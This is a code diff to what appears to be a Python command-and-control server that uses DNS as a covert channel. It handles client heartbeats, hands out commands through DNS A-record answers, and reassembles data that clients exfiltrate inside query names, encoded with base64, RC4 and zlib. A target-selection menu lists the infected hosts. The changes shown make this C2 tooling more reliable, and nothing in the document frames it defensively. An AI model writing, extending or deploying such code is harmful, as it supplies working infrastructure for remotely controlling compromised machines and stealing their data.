@@ -2,6 +2,7 @@ import datetime
 import signal
 import sys
 import threading
+import zlib
 from arc4 import ARC4
 from argparse import ArgumentParser
 from typing import Any, Dict
@@ -70,21 +71,23 @@ class Server:
             try:
                 data, addr = self.socket.recvfrom(1024)
                 request = DNSRecord.parse(data)
+
             except Exception:
                 self.__log("No valid input...")
                 continue
 
+            self.__log("{}: Got request: {}".format(addr, request.get_q().get_qname()))
             if request.get_q().get_qname().matchGlob(client_to_serv["HB"]):
                 # It is a heartbeat..
-                self.__log("{} Heartbeat".format(addr))
+                self.__log("{}: Heartbeat".format(addr))
                 repl = self.heartbeat_reply(request.reply(), addr)
 
-            elif request.get_q().get_qname().matchGlob(client_to_serv["response"]):
+            elif request.get_q().get_qname().matchSuffix(client_to_serv["RESP"]):
                 # It is a reply for our request:
                 self.__log("{}: We got a response for our request!".format(addr))
                 repl = self.extract_data_from_request(request, addr)
 
-            elif request.get_q().get_qname().matchGlob(client_to_serv["done"]):
+            elif request.get_q().get_qname().matchGlob(client_to_serv["DONE"]):
                 # The client has finished sending us data...
                 self.__log("{}: Finished request".format(addr))
                 repl = self.finished_stream(request, addr)
@@ -104,10 +107,13 @@ class Server:
             self.__log(
                 "{}: Finished receiving stream for command: {}".format(addr, self.commands_for_clients[addr].command))
             command = serv_to_client["ACK"]
+            self.commands_for_clients[addr].completed = True
 
             if not self.decrypt_segments(addr):
                 self.__log("Decrypting segments failed. Sending RST error signal")
                 command = serv_to_client["RST"]
+                self.commands_for_clients[addr].completed = False
+                self.commands_for_clients[addr].segments = []
 
         repl = request.reply()
         repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))
@@ -126,11 +132,17 @@ class Server:
         Attempts to decrypt segments
         :return: Whether the decryption was successful
         """
-
-        self.commands_for_clients[addr].segments = ARC4(self.password).decrypt(
-            b"".join(self.commands_for_clients[addr].segments))
-        # TODO: CHECK
-
+        try:
+            uncompressed = bytes("".join(self.commands_for_clients[addr].segments), "utf-8")
+            uncompressed = uncompressed.replace(b"_", b"/").replace(b"-", b"+")
+            uncompressed += b"=" * ((4 - len(uncompressed) % 4) % 4)
+            uncompressed = base64.b64decode(uncompressed)
+            uncompressed = ARC4(self.password).decrypt(uncompressed)
+            uncompressed = zlib.decompress(uncompressed)
+            self.commands_for_clients[addr].segments = uncompressed.decode("utf-8")
+        except Exception as e:
+            print("Error while processing data from {}: {}".format(addr, e))
+            return False
         return True
 
     def extract_data_from_request(self, request, addr):
@@ -171,9 +183,11 @@ class Server:
                 self.__log(
                     "{}: ERROR: The client has sent us a Heartbeat, while it was supposed to send a reply!".format(
                         addr))
-
-            self.commands_for_clients[addr].start()
-            command = self.commands_for_clients[addr].command
+                self.commands_for_clients[addr].started = False
+                command = serv_to_client["RST"]
+            else:
+                self.commands_for_clients[addr].start()
+                command = self.commands_for_clients[addr].command
 
         # Sanity check
         if command is None:
@@ -189,9 +203,10 @@ class Server:
         """
         Removes all inactive clients from the client list
         """
-        for i in self.connected_clients:
-            if abs((datetime.datetime.now() - self.connected_clients[
-                i]).total_seconds()) > 20:  # TODO: Change back to 200
+        addresses = list(self.connected_clients.keys())
+        for i in addresses:
+            # TODO: Change back to 200
+            if abs((datetime.datetime.now() - self.connected_clients[i]).total_seconds()) > 20:
                 print("Cleaning up client {} because of inactivity".format(i))
                 del self.connected_clients[i]
                 del self.commands_for_clients[i]
@@ -218,8 +233,10 @@ class Server:
             print("\n================")
             # Select IP to give commands to:
             print("0: Rescan")
-            for i in range(len(self.connected_clients.keys())):
-                print("{}: {}".format(i + 1, list(self.connected_clients.keys())[i]))
+            addresses = list(self.connected_clients.keys())
+            for i in range(len(addresses)):
+                print("{}: {} {}".format(i + 1, addresses[i],
+                                         "" if self.commands_for_clients[addresses[i]].completed else "- BUSY"))
 
             selected_ip = int(input("Select your target: \n================\n"))
             if selected_ip == 0:
